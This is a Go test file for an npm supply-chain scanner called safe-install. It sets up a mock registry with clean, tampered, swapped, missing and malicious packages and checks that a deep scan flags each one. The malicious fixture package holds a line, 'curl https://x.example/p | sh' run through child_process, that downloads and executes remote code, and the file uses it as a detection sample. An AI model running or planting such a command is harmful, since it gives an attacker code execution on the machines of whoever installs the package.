package cli

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/crossben/safe-install/internal/policy"
)

func tgzOf(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{Name: "package/" + name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func sri(b []byte) string {
	s := sha512.Sum512(b)
	return "sha512-" + base64.StdEncoding.EncodeToString(s[:])
}

// deepProject: a registry serving packuments and tarballs for evil-pkg (code
// that downloads and executes), clean-pkg, tampered-pkg (lockfile integrity
// does not match the tarball) and gone-pkg (tarball 404).
func deepProject(t *testing.T) *atomic.Int32 {
	t.Helper()
	tarballs := map[string][]byte{
		"evil-pkg":     tgzOf(t, map[string]string{"package.json": "{}", "index.js": `require('child_process').execSync("curl https://x.example/p | sh")`}),
		"clean-pkg":    tgzOf(t, map[string]string{"package.json": "{}", "index.js": "module.exports = 1"}),
		"tampered-pkg": tgzOf(t, map[string]string{"package.json": "{}", "index.js": "module.exports = 2"}),
		"gone-pkg":     tgzOf(t, map[string]string{"index.js": "module.exports = 3"}),
		"swapped-pkg":  tgzOf(t, map[string]string{"index.js": "module.exports = 4"}),
	}
	// swapped-pkg: lockfile and registry metadata agree, but the server
	// delivers other bytes (a compromised mirror). Only --deep can see it.
	swapped := tgzOf(t, map[string]string{"index.js": "module.exports = 'evil'"})
	var downloads atomic.Int32
	published := time.Now().Add(-400 * 24 * time.Hour).UTC().Format(time.RFC3339)
	var srv *httptest.Server
	srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		name := strings.Trim(r.URL.Path, "/")
		if pkg, _, ok := strings.Cut(name, "/-/"); ok {
			downloads.Add(1)
			if pkg == "gone-pkg" {
				http.NotFound(w, r)
				return
			}
			if pkg == "swapped-pkg" {
				_, _ = w.Write(swapped)
				return
			}
			_, _ = w.Write(tarballs[pkg])
			return
		}
		data := tarballs[name]
		if data == nil {
			http.NotFound(w, r)
			return
		}
		_ = json.NewEncoder(w).Encode(map[string]any{
			"name": name, "time": map[string]string{"1.0.0": published},
			"versions": map[string]any{"1.0.0": map[string]any{"version": "1.0.0", "dist": map[string]string{
				"integrity": sri(data), "tarball": srv.URL + "/" + name + "/-/" + name + "-1.0.0.tgz"}}},
		})
	}))
	t.Cleanup(srv.Close)

	entries := []string{`"":{"name":"p"}`}
	for name, data := range tarballs {
		integrity := sri(data)
		if name == "tampered-pkg" {
			integrity = sri([]byte("what the lockfile promised"))
		}
		entries = append(entries, `"node_modules/`+name+`":{"version":"1.0.0","resolved":"`+srv.URL+`/`+name+`/-/`+name+`-1.0.0.tgz","integrity":"`+integrity+`"}`)
	}
	dir := t.TempDir()
	for name, content := range map[string]string{
		".npmrc":            "registry=" + srv.URL + "/\n",
		"package.json":      `{"name":"p","version":"1.0.0"}`,
		"package-lock.json": `{"lockfileVersion":3,"packages":{` + strings.Join(entries, ",") + `}}`,
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("HOME", t.TempDir())
	t.Setenv("NPM_CONFIG_USERCONFIG", "")
	t.Setenv("npm_config_registry", "")
	t.Setenv("SAFE_INSTALL_REGISTRY_FIXTURES", "")
	t.Setenv("SAFE_INSTALL_OSV_URL", "off")
	t.Setenv("SAFE_INSTALL_DOWNLOADS_URL", "off")
	t.Setenv("SAFE_INSTALL_CONFIG_DIR", t.TempDir())
	t.Setenv("SAFE_INSTALL_CACHE_DIR", t.TempDir())
	t.Setenv("XDG_CACHE_HOME", t.TempDir())
	t.Chdir(dir)
	return &downloads
}

func deepFindings(t *testing.T, args ...string) (map[string][]string, []string, error) {
	t.Helper()
	out, err := runCLIOut(t, append([]string{"check", "--format", "json"}, args...)...)
	var rep struct {
		Warnings []string `json:"warnings"`
		Packages []struct {
			ID       string `json:"id"`
			Findings []struct {
				Rule string `json:"rule"`
			} `json:"findings"`
		} `json:"packages"`
	}
	if jerr := json.Unmarshal([]byte(out), &rep); jerr != nil {
		t.Fatalf("json: %v\n%s", jerr, out)
	}
	got := map[string][]string{}
	for _, p := range rep.Packages {
		for _, f := range p.Findings {
			got[p.ID] = append(got[p.ID], f.Rule)
		}
	}
	return got, rep.Warnings, err
}

func TestCheckDeep(t *testing.T) {
	downloads := deepProject(t)

	got, _, _ := deepFindings(t)
	if len(got["evil-pkg@1.0.0"]) != 0 || downloads.Load() != 0 {
		t.Fatalf("without --deep: findings %v, %d downloads", got, downloads.Load())
	}

	got, warnings, err := deepFindings(t, "--deep")
	if exitCode(err) != ExitPolicyFailure {
		t.Fatalf("exit = %d (%v)", exitCode(err), err)
	}
	if strings.Join(got["evil-pkg@1.0.0"], ",") != "SI-CODE-001" {
		t.Errorf("evil-pkg: %v", got["evil-pkg@1.0.0"])
	}
	if strings.Join(got["tampered-pkg@1.0.0"], ",") != "SI-INT-001" {
		t.Errorf("tampered-pkg (lockfile vs registry): %v", got["tampered-pkg@1.0.0"])
	}
	if strings.Join(got["swapped-pkg@1.0.0"], ",") != "SI-INT-001" {
		t.Errorf("swapped-pkg (bytes vs lockfile): %v", got["swapped-pkg@1.0.0"])
	}
	if len(got["clean-pkg@1.0.0"]) != 0 {
		t.Errorf("clean-pkg: %v", got["clean-pkg@1.0.0"])
	}
	if len(warnings) != 1 || !strings.Contains(warnings[0], "gone-pkg@1.0.0") {
		t.Errorf("warnings = %v", warnings)
	}

	// Scanned versions come from the cache; the blocked tampered-pkg is never
	// downloaded; swapped-pkg and gone-pkg are retried.
	before := downloads.Load()
	if _, _, _ = deepFindings(t, "--deep"); downloads.Load()-before != 2 {
		t.Errorf("second run downloaded %d tarballs, want 2 (swapped, gone)", downloads.Load()-before)
	}
}

// check --deep has no installed file: an acceptance for a code finding is
// matched on the hash of the tarball entry (the file the package manager
// would unpack), so a reviewed file passes and a different one does not.
func TestCheckDeepAcceptsByTarballFileHash(t *testing.T) {
	deepProject(t)
	evil := `require('child_process').execSync("curl https://x.example/p | sh")`
	sum := sha256.Sum256([]byte(evil))
	hash := "sha256:" + hex.EncodeToString(sum[:])
	write := func(h string) {
		acc := `{"acceptFindings":{"evil-pkg":[{"version":"1.0.0","rule":"SI-CODE-001","file":"index.js","hash":"` + h + `","reason":"reviewed","by":"ben"}]}}`
		if err := os.WriteFile(policy.FileName, []byte(acc), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	accepted := func() bool {
		out, _ := runCLIOut(t, "check", "--deep", "--format", "json")
		var rep struct {
			Packages []struct {
				ID       string `json:"id"`
				Level    string `json:"level"`
				Findings []struct {
					File     string          `json:"file"`
					Accepted json.RawMessage `json:"accepted"`
				} `json:"findings"`
			} `json:"packages"`
		}
		if err := json.Unmarshal([]byte(out), &rep); err != nil {
			t.Fatal(err)
		}
		for _, p := range rep.Packages {
			if p.ID == "evil-pkg@1.0.0" {
				if p.Findings[0].File != "index.js" {
					t.Errorf("finding file = %q", p.Findings[0].File)
				}
				return p.Findings[0].Accepted != nil && p.Level == "none"
			}
		}
		t.Fatal("evil-pkg missing")
		return false
	}
	write(hash)
	if !accepted() {
		t.Error("the reviewed file was not accepted")
	}
	write("sha256:" + strings.Repeat("0", 64))
	if accepted() {
		t.Error("a different file was accepted")
	}
}
